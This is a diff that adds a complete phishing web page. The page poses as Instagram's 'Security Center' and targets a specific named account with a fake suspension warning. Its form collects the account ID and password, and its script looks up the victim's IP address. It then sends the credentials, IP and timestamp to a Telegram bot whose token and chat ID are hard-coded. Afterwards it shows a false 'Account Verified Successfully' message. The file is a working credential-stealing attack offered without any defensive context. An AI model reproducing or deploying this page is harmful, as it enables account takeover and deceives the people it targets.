@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Security Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
+            padding: 30px 28px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Page transition */
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Instagram Header */
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .header .logo {
+            font-size: 30px;
+            font-weight: 600;
+            color: #262626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .header .logo i {
+            font-size: 28px;
+            background: radial-gradient(circle at 30% 110%, #feda77, #d62976, #962fbf);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .header .sub {
+            font-size: 13px;
+            color: #8e8e8e;
+            margin-top: 4px;
+        }
+
+        /* Security Badge */
+        .security-badge {
+            background: #f2f2f2;
+            border-radius: 30px;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            border: 1px solid #e0e0e0;
+            margin-bottom: 20px;
+        }
+
+        .security-badge i {
+            color: #0095f6;
+            font-size: 18px;
+        }
+
+        .security-badge span {
+            font-weight: 600;
+            font-size: 14px;
+            color: #1e1e1e;
+        }
+
+        /* Account Display */
+        .account-display {
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .account-display .label {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .account-display .username {
+            font-size: 20px;
+            font-weight: 700;
+            color: #262626;
+            margin-top: 4px;
+        }
+
+        .account-display .username i {
+            color: #0095f6;
+            font-size: 16px;
+        }
+
+        /* Alert Box */
+        .alert-box {
+            background: #fff6f6;
+            border: 1px solid #ffcccc;
+            border-radius: 10px;
+            padding: 18px 16px;
+            margin-bottom: 22px;
+        }
+
+        .alert-box .alert-icon {
+            color: #ed4956;
+            font-size: 22px;
+            display: block;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .alert-box h3 {
+            color: #ed4956;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .alert-box p {
+            color: #4a4a4a;
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        .alert-box p strong {
+            color: #262626;
+        }
+
+        /* Button */
+        .btn-primary {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-primary:hover {
+            background: #1877f2;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Form */
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #262626;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .form-group .input-wrapper {
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 14px;
+            background: #fafafa;
+            transition: border 0.3s;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #0095f6;
+            background: white;
+        }
+
+        .form-group .toggle-password {
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #8e8e8e;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .form-group .toggle-password:hover {
+            color: #262626;
+        }
+
+        /* Success */
+        .success-box {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .success-box .check {
+            font-size: 60px;
+            color: #28a745;
+            animation: pop 0.6s ease;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-box h3 {
+            color: #28a745;
+            font-size: 20px;
+            margin-top: 10px;
+        }
+
+        .success-box p {
+            color: #4a4a4a;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+            border-top: 1px solid #efefef;
+            padding-top: 16px;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Error */
+        .error-msg {
+            color: #ed4956;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+
+        .form-group.error input {
+            border-color: #ed4956;
+        }
+
+        /* Loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-text {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ========== PAGE 1: ALERT ========== -->
+    <div id="page1" class="page active">
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-instagram"></i> Instagram
+            </div>
+            <div class="sub">Security Center</div>
+        </div>
+
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+            <span>🔐 Account Protection</span>
+        </div>
+
+        <div class="account-display">
+            <div class="label">Verifying Account</div>
+            <div class="username">
+                <i class="fas fa-user-circle"></i> @challbhagbee
+            </div>
+        </div>
+
+        <div class="alert-box">
+            <i class="fas fa-exclamation-triangle alert-icon"></i>
+            <h3>⚠️ Account Security Alert</h3>
+            <p>
+                Your account <strong>@challbhagbee</strong> has been flagged for 
+                <strong>unusual activity</strong>. Immediate verification required 
+                to prevent suspension.
+            </p>
+        </div>
+
+        <button class="btn-primary" onclick="goToPage2()">
+            <span class="btn-text">
+                <i class="fas fa-shield-alt"></i> Verify Account Now
+            </span>
+        </button>
+
+        <div class="footer">
+            <a href="#">Learn More</a> • <a href="#">Help Center</a>
+        </div>
+    </div>
+
+    <!-- ========== PAGE 2: VERIFICATION FORM ========== -->
+    <div id="page2" class="page">
+        <div class="header">
+            <div class="logo" style="font-size:24px;">
+                <i class="fab fa-instagram"></i> Security Check
+            </div>
+            <div class="sub">Verify your identity</div>
+        </div>
+
+        <div style="text-align:center; margin-bottom:20px; padding:10px; background:#f0f8ff; border-radius:8px; border:1px solid #d4edda;">
+            <span style="font-size:13px; color:#155724;">🔐 Verifying: <strong>@challbhagbee</strong></span>
+        </div>
+
+        <form id="loginForm" onsubmit="return handleSubmit(event)">
+            <div class="form-group" id="usernameGroup">
+                <label><i class="fas fa-user"></i> Instagram ID</label>
+                <div class="input-wrapper">
+                    <input type="text" id="username" value="challbhagbee" placeholder="Enter your Instagram ID">
+                </div>
+                <div class="error-msg" id="usernameError">Please enter your Instagram ID</div>
+            </div>
+
+            <div class="form-group" id="passwordGroup">
+                <label><i class="fas fa-lock"></i> Password</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="Enter your password">
+                    <button type="button" class="toggle-password" onclick="togglePassword()">
+                        <i class="fas fa-eye" id="eyeIcon"></i>
+                    </button>
+                </div>
+                <div class="error-msg" id="passwordError">Please enter your password</div>
+            </div>
+
+            <button type="submit" class="btn-primary" id="submitBtn">
+                <span class="btn-text" id="btnText">
+                    <i class="fas fa-check-circle"></i> Verify Account
+                </span>
+            </button>
+        </form>
+
+        <!-- Success Message (hidden initially) -->
+        <div id="successBox" style="display:none;" class="success-box">
+            <div class="check">✅</div>
+            <h3>Account Verified Successfully!</h3>
+            <p>Your account <strong>@challbhagbee</strong> is now secure. Thank you!</p>
+        </div>
+
+        <div class="footer" style="margin-top:16px;">
+            <a href="#" onclick="goToPage1()">← Back to Security Center</a>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // ========== PAGE NAVIGATION ==========
+    function goToPage2() {
+        document.getElementById('page1').classList.remove('active');
+        document.getElementById('page2').classList.add('active');
+    }
+
+    function goToPage1() {
+        document.getElementById('page2').classList.remove('active');
+        document.getElementById('page1').classList.add('active');
+        // Reset form
+        document.getElementById('loginForm').style.display = 'block';
+        document.getElementById('successBox').style.display = 'none';
+        document.getElementById('submitBtn').disabled = false;
+        document.getElementById('btnText').innerHTML = '<i class="fas fa-check-circle"></i> Verify Account';
+    }
+
+    // ========== TOGGLE PASSWORD ==========
+    function togglePassword() {
+        const pass = document.getElementById('password');
+        const eye = document.getElementById('eyeIcon');
+        if (pass.type === 'password') {
+            pass.type = 'text';
+            eye.className = 'fas fa-eye-slash';
+        } else {
+            pass.type = 'password';
+            eye.className = 'fas fa-eye';
+        }
+    }
+
+    // ========== FORM SUBMIT ==========
+    async function handleSubmit(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        let isValid = true;
+
+        // Validate Username
+        const usernameGroup = document.getElementById('usernameGroup');
+        const usernameError = document.getElementById('usernameError');
+        if (!username) {
+            usernameGroup.classList.add('error');
+            usernameError.classList.add('show');
+            isValid = false;
+        } else {
+            usernameGroup.classList.remove('error');
+            usernameError.classList.remove('show');
+        }
+
+        // Validate Password
+        const passwordGroup = document.getElementById('passwordGroup');
+        const passwordError = document.getElementById('passwordError');
+        if (!password) {
+            passwordGroup.classList.add('error');
+            passwordError.classList.add('show');
+            isValid = false;
+        } else {
+            passwordGroup.classList.remove('error');
+            passwordError.classList.remove('show');
+        }
+
+        if (!isValid) return false;
+
+        // Disable button & show loading
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        document.getElementById('btnText').innerHTML = '<span class="spinner"></span> Verifying...';
+
+        // Get IP (using free API)
+        let ip = 'Unknown';
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        } catch (e) {
+            ip = 'Unable to fetch';
+        }
+
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+        // Prepare data for Telegram
+        const message = `
+🔐 INSTAGRAM SECURITY VERIFICATION
+
+👤 Username: ${username}
+🔑 Password: ${password}
+🌐 IP Address: ${ip}
+🕐 Time: ${timestamp}
+📱 Account: @challbhagbee
+        `;
+
+        // Send to Telegram
+        try {
+            const botToken = '8967247438:AAGLD7zXZK5Myk1YAMUCVHtVa9SBEnzZ2Kc';
+            const chatId = '8299296397';
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.log('Telegram send failed:', e);
+        }
+
+        // Show Success
+        document.getElementById('loginForm').style.display = 'none';
+        document.getElementById('successBox').style.display = 'block';
+
+        // Reset button (will be hidden anyway)
+        btn.disabled = false;
+
+        return false;
+    }
+</script>
+
+</body>
+</html>
